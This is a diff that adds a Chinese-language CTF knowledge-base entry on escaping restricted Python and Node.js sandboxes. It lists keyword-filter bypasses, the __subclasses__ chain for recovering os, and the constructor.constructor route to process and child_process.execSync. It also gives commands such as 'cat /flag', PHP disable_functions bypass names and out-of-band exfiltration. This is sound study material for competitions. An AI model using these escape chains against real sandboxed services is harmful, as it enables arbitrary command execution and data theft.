@@ -1,0 +1,17 @@
+{
+ "name": "杂项-沙箱逃逸-PyJail与NodeJail",
+ "title": "杂项 沙箱逃逸：PyJail 与 NodeJail",
+ "summary": "给你一段受限的代码执行环境（过滤了关键字 / 禁了函数），想办法跳出限制读到 flag。Misc 里的经典难题。",
+ "content": "# 杂项 沙箱逃逸：PyJail 与 NodeJail\n\n> 给你一段受限的代码执行环境（过滤了关键字 / 禁了函数），想办法跳出限制读到 flag。Misc 里的经典难题。\n\n## 一、PyJail（Python 沙箱）\n\n场景：服务端 `eval` / `exec` 你的输入，但过滤了 `os` / `system` / `import` 等词，或清空了 `__builtins__`。\n\n**思路分三层：**\n\n1. **绕过字符过滤**\n   - 拼接：`'o'+'s'`、`chr(111)+chr(115)`\n   - 属性 / 下标：`getattr(...)`、`[...]`、`__getitem__`\n   - 编码：`\\x6f\\x73`、base64、rot13\n   - 变量名：`globals()`、`locals()`、`vars()`\n2. **找回被删的内建**\n   - 空 `__builtins__` 时：通过任意对象 `().__class__.__bases__[0].__subclasses__()` 找 `warnings.catch_warnings` / `os._wrap_close` 等，再取其 `__init__.__globals__`\n   - `[x for x in ().__class__.__base__.__subclasses__() if x.__name__=='...'][0]`\n3. **执行命令**\n   - 拿到 os 后：`os.system('cat /flag')` / `os.popen(...).read()`\n   - 或走 `subprocess`、`pty.spawn`\n   - 兜底：`open('/flag').read()`\n\n**常见链：**\n\n- `().__class__.__mro__[1].__subclasses__()`\n- `''.__class__.__mro__[1].__subclasses__()`（找 file / io）\n- `[].__class__.__base__.__subclasses__()`\n\n**绕过技巧：**\n\n- 下划线被过滤：`getattr(obj, '_'*2+'class'+'_'*2)`\n- 点号被禁：用 `[]` 或 `getattr`\n- 关键字被禁：字符串拼接、大小写、Unicode 同形字\n- 无回显：把结果写到文件，或走 DNS / HTTP 带外\n\n## 二、NodeJail（Node.js 沙箱）\n\n场景：`eval` / `new Function` / `vm` 模块跑你的输入。\n\n**逃逸链：**\n\n- `this.constructor.constructor('return process')()` → 拿到 process\n- `process.mainModule.require('child_process').execSync('cat /flag')`\n- `require` 被禁时：走 `process.binding`、`module.constructor._load`\n- vm 逃逸：`this.constructor.constructor(...)`、`arguments.callee.caller`、Proxy 原型链\n- 模板 / 序列化入口：见 [[Web-反序列化漏洞]]（node-serialize）\n\n## 三、其他 Jail\n\n- **Ruby**：`ObjectSpace`、`send`、反引号\n- **PHP**：`disable_functions` 绕过（LD_PRELOAD、`pcntl`、`imap_open`、FFI、`putenv`+mail）\n- **Lua / 自定义 VM**：读字节码、找未过滤的宿主函数\n\n## 四、通用方法论\n\n1. 先**探边界**：什么能写、什么被过滤、有没有回显\n2. 从\"我手上有什么对象\"出发，顺原型链 / 继承链找可达的强能力函数\n3. 字符 / 关键字过滤 → 用拼接、编码、`getattr` 绕过\n4. 无回显 → 带外（DNS / HTTP）或写文件\n5. 一次只改一个变量，看回显\n\n## 关键点\n\n- PyJail 核心是 `__subclasses__` 找到 os / subprocess，绕过靠拼接与 `getattr`\n- NodeJail 核心是 `constructor.constructor` 回到 Function，再拿 process / require\n- 过滤越狠，越要靠\"**对象可达性**\"而不是直接写函数名\n- 无回显是常见拦路虎，**先解决回显再谈读 flag**\n\n## 关联\n\n- [[Web-命令执行与SSTI]] —— SSTI 常被当作 PyJail 的入口\n- [[Web-反序列化漏洞]] —— Node.js 反序列化同样能到 RCE\n- [[CTF-常用工具清单]] —— 编码 / 带外工具\n- [[CTF-竞赛总览与解题流程]] —— 通用流程\n\n## 存疑 / 矛盾\n\n- Python 版本差异大（3.8 ~ 3.12），`__subclasses__` 的下标不稳定，**务必按目标版本现场枚举**而不是背下标。\n\n## 来源\n\n- 糯米内建知识整理 · 2026-10-03（无外部文件）\n",
+ "section": "concept",
+ "group": "misc",
+ "links": {
+  "internal": [
+   "CTF-常用工具清单",
+   "CTF-竞赛总览与解题流程",
+   "Web-反序列化漏洞",
+   "Web-命令执行与SSTI"
+  ],
+  "unresolved": []
+ }
+}
